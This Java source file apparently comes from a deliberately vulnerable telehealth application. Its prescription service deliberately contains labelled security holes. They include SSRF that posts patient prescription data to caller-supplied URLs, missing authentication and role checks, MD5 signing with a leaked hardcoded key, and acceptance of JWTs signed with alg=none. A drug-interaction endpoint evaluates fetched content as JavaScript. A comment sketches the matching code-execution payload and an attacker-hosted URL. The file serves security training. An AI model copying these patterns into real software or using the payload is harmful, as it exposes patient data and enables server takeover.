package com.mediconnect.service;

import com.lowagie.text.Document;
import com.lowagie.text.Element;
import com.lowagie.text.Font;
import com.lowagie.text.Paragraph;
import com.lowagie.text.pdf.PdfWriter;
import com.mediconnect.dto.PrescriptionDto;
import com.mediconnect.dto.PrescriptionSignatureDto;
import com.mediconnect.entity.*;
import com.mediconnect.enums.PrescriptionStatus;
import com.mediconnect.repository.*;
import lombok.RequiredArgsConstructor;
import org.springframework.http.HttpHeaders;
import org.springframework.stereotype.Service;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.util.HashMap;
import java.util.Map;

@Service
@RequiredArgsConstructor
public class DoctorPrescribingService {

    private final PrescriptionRepository prescriptionRepository;
    private final PatientRepository patientRepository;
    private final DoctorRepository doctorRepository;
    private final UserRepository userRepository;
    private final PrescriptionSigner signer;
    private final JwtNoneVerifier jwtVerifier;
    private final ExternalCatalogueClient catalogueClient;

    // -------------------------------------------------------------------------
    // POST /api/doctor/prescriptions
    // -------------------------------------------------------------------------
    //
    // [A03] If body contains `pharmacyCallbackUrl`, the server POSTs the
    //        prescription payload to that URL (SSRF + outbound data exfil).
    // [A07] doctorId / patientId / pharmacistId all from body — no JWT check.
    // [A01] No role check, no "is this my patient" check.
    public PrescriptionDto create(Map<String, Object> body) {
        Long patientId   = numericId(body, "patientId");
        Long doctorId    = numericId(body, "doctorId");
        Long pharmacistId = numericId(body, "pharmacistId");
        String medication = body.get("medicationName") == null ? "Unknown" : body.get("medicationName").toString();
        String dosage     = body.get("dosage")         == null ? ""        : body.get("dosage").toString();
        String instructions = body.get("instructions") == null ? ""        : body.get("instructions").toString();
        String pharmacyCb = body.get("pharmacyCallbackUrl") == null ? null : body.get("pharmacyCallbackUrl").toString();

        Patient patient = patientId == null ? null : patientRepository.findById(patientId).orElse(null);
        Doctor doctor   = doctorId  == null ? null : doctorRepository.findById(doctorId).orElse(null);
        User pharmacist = pharmacistId == null ? null : userRepository.findById(pharmacistId).orElse(null);

        Prescription rx = Prescription.builder()
                .patient(patient)
                .doctor(doctor)
                .pharmacist(pharmacist)
                .medicationName(medication)
                .dosage(dosage)
                .instructions(instructions)
                .status(PrescriptionStatus.CREATED)
                .pharmacyCallbackUrl(pharmacyCb)
                .createdAt(LocalDateTime.now())
                .build();
        Prescription saved = prescriptionRepository.save(rx);

        if (pharmacyCb != null && !pharmacyCb.isBlank()) {
            // [A03] SSRF — POST prescription payload to the caller-controlled URL.
            //        Bonus exfil: prescription incl. patient name + medication
            //        ships to the attacker's endpoint as JSON.
            sendPharmacyNotice(pharmacyCb, saved);
        }

        return toDto(saved);
    }

    private void sendPharmacyNotice(String url, Prescription rx) {
        try {
            URI uri = URI.create(url);
            URL u = uri.toURL();
            HttpURLConnection conn = (HttpURLConnection) u.openConnection();
            conn.setConnectTimeout(5_000);
            conn.setReadTimeout(5_000);
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            String body = String.format(
                    "{\"prescriptionId\":%d,\"patientId\":%s,\"medication\":\"%s\",\"dosage\":\"%s\"}",
                    rx.getId(),
                    rx.getPatient() == null ? "null" : String.valueOf(rx.getPatient().getId()),
                    escape(rx.getMedicationName()),
                    escape(rx.getDosage()));
            try (OutputStream os = conn.getOutputStream()) {
                os.write(body.getBytes(StandardCharsets.UTF_8));
            }
            // Drain response so server doesn't half-close; we don't need it.
            try (var in = conn.getInputStream()) { in.readAllBytes(); }
            catch (Exception ignore) { /* [A10] swallow downstream errors */ }
        } catch (Exception ignore) {
            // [A10] Silent — pharmacy POST failure does not block create.
        }
    }

    // -------------------------------------------------------------------------
    // POST /api/doctor/prescriptions/{id}/sign
    // -------------------------------------------------------------------------
    //
    // [A08] MD5 + hardcoded key signature.
    // [A02][A04] Response body returns the signing key in plaintext so caller
    //            immediately learns the secret.
    public PrescriptionSignatureDto sign(Long id) {
        Prescription rx = prescriptionRepository.findById(id)
                .orElseThrow(() -> new RuntimeException("Prescription not found: " + id));
        String sig = signer.md5Signature(rx);
        rx.setSignatureMd5(sig);
        rx.setSignedAt(LocalDateTime.now());
        prescriptionRepository.save(rx);
        return PrescriptionSignatureDto.builder()
                .prescriptionId(rx.getId())
                .signatureMd5(sig)
                .signedPayload(signer.signedPayload(rx))
                .signingKey(PrescriptionSigner.SECRET)
                .signedAt(rx.getSignedAt())
                .coSignerUsername(rx.getCoSignerUsername())
                .build();
    }

    // -------------------------------------------------------------------------
    // GET /api/doctor/prescriptions/{id}/pdf
    // -------------------------------------------------------------------------
    //
    // [A08] PDF generated by OpenPDF with no PKCS#7 signature, no digital
    //        certificate, no Content-MD5 header. Anyone with the bytes can
    //        modify them and re-distribute — the "signature line" in the PDF
    //        is just text printed by this method.
    public byte[] generatePdf(Long id) {
        Prescription rx = prescriptionRepository.findById(id)
                .orElseThrow(() -> new RuntimeException("Prescription not found: " + id));
        Patient pat = rx.getPatient();
        User patU = pat == null ? null : pat.getUser();
        Doctor doc = rx.getDoctor();
        User docU = doc == null ? null : doc.getUser();

        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            Document pdf = new Document();
            PdfWriter.getInstance(pdf, baos);
            pdf.open();
            pdf.add(new Paragraph("MediConnect Prescription #" + rx.getId(),
                    new Font(Font.HELVETICA, 16, Font.BOLD)));
            pdf.add(new Paragraph(" "));
            pdf.add(new Paragraph("Patient: " + (patU == null ? "—"
                    : ((patU.getFirstName() == null ? "" : patU.getFirstName()) + " "
                    + (patU.getLastName() == null ? "" : patU.getLastName())).trim())));
            pdf.add(new Paragraph("Doctor:  " + (docU == null ? "—"
                    : ((docU.getFirstName() == null ? "" : docU.getFirstName()) + " "
                    + (docU.getLastName() == null ? "" : docU.getLastName())).trim())));
            pdf.add(new Paragraph(" "));
            pdf.add(new Paragraph("Medication: " + rx.getMedicationName()));
            pdf.add(new Paragraph("Dosage:     " + rx.getDosage()));
            pdf.add(new Paragraph("Instructions: " + rx.getInstructions()));
            pdf.add(new Paragraph(" "));
            // [A08] "Signature" is just text — no PKCS#7, no certificate.
            pdf.add(new Paragraph("Signature (MD5): " + (rx.getSignatureMd5() == null
                    ? "(unsigned)" : rx.getSignatureMd5()),
                    new Font(Font.COURIER, 9)));
            Paragraph footer = new Paragraph(
                    "This PDF is NOT digitally signed (no PKCS#7 wrapper, no certificate chain).",
                    new Font(Font.HELVETICA, 8, Font.ITALIC));
            footer.setAlignment(Element.ALIGN_LEFT);
            pdf.add(footer);
            pdf.close();
            return baos.toByteArray();
        } catch (Exception e) {
            throw new RuntimeException("PDF generation failed: " + e.getMessage(), e);
        }
    }

    // -------------------------------------------------------------------------
    // POST /api/doctor/drug-interactions/check
    // -------------------------------------------------------------------------
    //
    // Body: {"medications":[...], "catalogueUrl":"http://attacker/feed.js"}
    //
    // [A03] catalogueUrl is fetched server-side (SSRF — same sink as
    //        ExternalCatalogueClient).
    // [A05] The response body is then evaluated as JavaScript via Nashorn
    //        ScriptEngine.eval(). Standard SSRF → RCE pivot: caller controls
    //        a public HTTPS endpoint that returns:
    //          Java.type("java.lang.Runtime").getRuntime().exec("touch /tmp/pwn")
    //        which executes inside the JVM with the application's privileges.
    public Map<String, Object> drugInteractions(Map<String, Object> body) {
        String catalogueUrl = body == null || body.get("catalogueUrl") == null
                ? null : body.get("catalogueUrl").toString();
        Map<String, Object> result = new HashMap<>();
        result.put("medications", body == null ? null : body.get("medications"));
        if (catalogueUrl == null || catalogueUrl.isBlank()) {
            result.put("status", "no-catalogue");
            return result;
        }
        // [A03] Fetch the caller-supplied URL — same URLConnection sink.
        HttpHeaders[] hdr = new HttpHeaders[1];
        byte[] bytes = catalogueClient.fetchBytes(catalogueUrl, hdr);
        String raw = new String(bytes, StandardCharsets.UTF_8);
        result.put("rawResponse", raw);
        // [A05] Nashorn evaluates the response verbatim — RCE pivot.
        try {
            ScriptEngineManager mgr = new ScriptEngineManager();
            ScriptEngine js = mgr.getEngineByName("nashorn");
            if (js == null) js = mgr.getEngineByName("javascript");
            if (js == null) js = mgr.getEngineByName("JavaScript");
            Object evaluated = js == null ? raw : js.eval(raw);
            result.put("normalized", evaluated == null ? null : evaluated.toString());
            result.put("status", "ok");
        } catch (Exception e) {
            // [A10] Raw exception message bubbles to caller.
            result.put("status", "eval-error");
            result.put("error", e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        return result;
    }

    // -------------------------------------------------------------------------
    // POST /api/doctor/prescriptions/{id}/co-sign
    // -------------------------------------------------------------------------
    //
    // [A08] JWT alg=none accepted via JwtNoneVerifier (same sink as Module B).
    // [A07] No correlation between co-signer identity and the JWT used to
    //        make the request — identity wholly client-asserted.
    public PrescriptionDto coSign(Long id, Map<String, Object> body) {
        Prescription rx = prescriptionRepository.findById(id)
                .orElseThrow(() -> new RuntimeException("Prescription not found: " + id));
        String jwt = body == null || body.get("jwt") == null ? null : body.get("jwt").toString();
        String sub = jwtVerifier.extractSubjectUnsafe(jwt);
        rx.setSignatureJwt(jwt);
        rx.setCoSignerUsername(sub == null ? "unknown" : sub);
        return toDto(prescriptionRepository.save(rx));
    }

    // -------------------------------------------------------------------------
    // Helpers
    // -------------------------------------------------------------------------
    private Long numericId(Map<String, Object> body, String key) {
        Object v = body == null ? null : body.get(key);
        if (v == null) return null;
        if (v instanceof Number n) return n.longValue();
        try { return Long.parseLong(v.toString()); } catch (Exception e) { return null; }
    }

    private String escape(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private PrescriptionDto toDto(Prescription p) {
        Patient pat = p.getPatient();
        User patU = pat == null ? null : pat.getUser();
        Doctor doc = p.getDoctor();
        User docU = doc == null ? null : doc.getUser();
        return PrescriptionDto.builder()
                .id(p.getId())
                .patientId(pat == null ? null : pat.getId())
                .patientName(patU == null ? null
                        : ((patU.getFirstName() == null ? "" : patU.getFirstName()) + " "
                        + (patU.getLastName() == null ? "" : patU.getLastName())).trim())
                .doctorId(doc == null ? null : doc.getId())
                .doctorName(docU == null ? null
                        : ((docU.getFirstName() == null ? "" : docU.getFirstName()) + " "
                        + (docU.getLastName() == null ? "" : docU.getLastName())).trim())
                .pharmacistId(p.getPharmacist() == null ? null : p.getPharmacist().getId())
                .medicationName(p.getMedicationName())
                .dosage(p.getDosage())
                .instructions(p.getInstructions())
                .status(p.getStatus())
                .createdAt(p.getCreatedAt())
                .dispensedAt(p.getDispensedAt())
                .build();
    }
}
